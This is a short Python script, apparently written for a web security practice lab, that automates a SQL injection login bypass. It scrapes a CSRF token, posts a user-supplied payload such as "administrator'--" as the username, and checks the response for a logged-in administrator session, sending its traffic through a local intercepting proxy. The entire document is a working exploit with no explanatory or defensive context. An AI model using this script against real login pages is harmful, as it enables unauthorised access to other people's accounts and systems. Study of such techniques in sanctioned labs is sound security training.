import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)

    data = {
        "csrf": csrf,
        "username": payload,
        "password": "anything"
    }

    r = s.post(url + "/login", data=data, verify=False)

    if "Log out" in r.text or "administrator" in r.text:
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] example: %s www.example.com "administrator\'--" ' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")